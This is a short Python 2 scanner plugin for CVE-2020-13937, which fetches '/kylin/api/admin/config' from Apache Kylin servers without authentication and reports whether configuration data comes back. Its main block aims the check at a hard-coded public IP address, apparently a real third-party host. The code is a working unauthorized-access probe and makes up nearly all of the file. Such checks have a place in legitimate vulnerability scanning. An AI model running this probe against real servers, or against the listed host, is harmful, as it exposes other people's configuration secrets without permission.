# coding:utf-8
import requests
import json

def get_plugin_info():
    plugin_info = {
        "name": "Apache Kylin的未授权配置泄露(CVE-2020-13937)",
        "info": "Apache Kylin的未授权配置泄露(CVE-2020-13937)",
        "level": "中危",
        "type": "未授权访问",
        "author": "zinc",
        "url": "https://help.aliyun.com/noticelist/articleid/1060733129.html",
        "keyword": "server:apache",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        url = ''
        urls = ''
        path = '/kylin/api/admin/config'
        if port == 443:
            url = 'https://%s%s' % (ip, path)
        elif port == 80:
            url = 'http://%s%s' % (ip, path)
        else:
            url = 'http://%s:%d%s' % (ip, port, path)
            urls = 'https://%s:%d%s' % (ip, port, path)
        
        url = url if url else urls

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }

        r = requests.get(url, headers=headers, timeout=timeout, verify=False)

        contents = json.loads(r.content)
        if contents.has_key('config'):
            print u"未授权访问"
            return u"未授权访问"

    except Exception as e:
        print e

if __name__ == '__main__':
    check('121.43.165.59',7070, 3)